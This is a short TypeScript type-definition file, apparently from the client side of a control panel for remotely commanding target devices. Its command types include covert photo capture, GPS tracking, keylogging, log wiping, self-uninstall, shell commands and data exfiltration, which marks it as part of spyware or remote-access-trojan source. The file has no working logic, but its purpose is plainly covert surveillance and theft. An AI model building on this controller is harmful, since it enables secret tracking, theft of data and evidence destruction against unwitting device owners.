'use client';

export type TargetStatus = 'ONLINE' | 'OFFLINE' | 'UNKNOWN' | string;

export interface Target {
  id: string;
  deviceInfo?: {
    model?: string;
    os?: string;
    serial?: string;
    [key: string]: any;
  };
  status?: TargetStatus;
  battery?: number;
  lastSeen?: number;
  last_ping?: number;
  [key: string]: any;
}

export type CommandAction =
  | 'capture_photo'
  | 'take_photo'
  | 'get_gps'
  | 'wipe_logs'
  | 'toggle_keylog'
  | 'self_uninstall'
  | 'shell_command'
  | 'data_exfil';

export interface Command {
  deviceId: string;
  action: CommandAction;
  timestamp?: number;
  status?: 'pending' | 'executing' | 'completed' | 'failed';
  payload?: Record<string, any>;
}
